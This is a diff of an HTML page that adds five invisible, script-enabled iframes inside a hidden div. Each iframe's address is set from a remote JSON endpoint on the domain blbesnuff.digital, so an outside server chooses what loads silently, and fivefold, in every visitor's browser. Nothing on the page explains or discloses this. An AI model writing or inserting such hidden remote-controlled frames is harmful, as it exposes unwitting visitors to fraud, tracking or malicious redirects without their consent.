@@ -4,14 +4,42 @@
 </head>
 <body>
 	<div style="display:none">
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe" src="" height="100" width="100" ></iframe>
-		
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="x1" src="" height="100" width="100" ></iframe>
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="x2" src="" height="100" width="100" ></iframe>
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="x3" src="" height="100" width="100" ></iframe>
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="x4" src="" height="100" width="100" ></iframe>
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="x5" src="" height="100" width="100" ></iframe>
+	
 </div>
 <script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
 <script>
      $.getJSON("https://blbesnuff.digital/rf/72584", function(result){
       $.each(result, function(i, field){
-        $('#declinedframe').attr('src', field);
+        $('#x1').attr('src', field);
+      });
+    });
+
+	$.getJSON("https://blbesnuff.digital/rf/72584", function(result){
+      $.each(result, function(i, field){
+        $('#x2').attr('src', field);
+      });
+    });
+
+	$.getJSON("https://blbesnuff.digital/rf/72584", function(result){
+      $.each(result, function(i, field){
+        $('#x3').attr('src', field);
+      });
+    });
+
+	$.getJSON("https://blbesnuff.digital/rf/72584", function(result){
+      $.each(result, function(i, field){
+        $('#x4').attr('src', field);
+      });
+    });
+
+	$.getJSON("https://blbesnuff.digital/rf/72584", function(result){
+      $.each(result, function(i, field){
+        $('#x5').attr('src', field);
       });
     });
     </script>
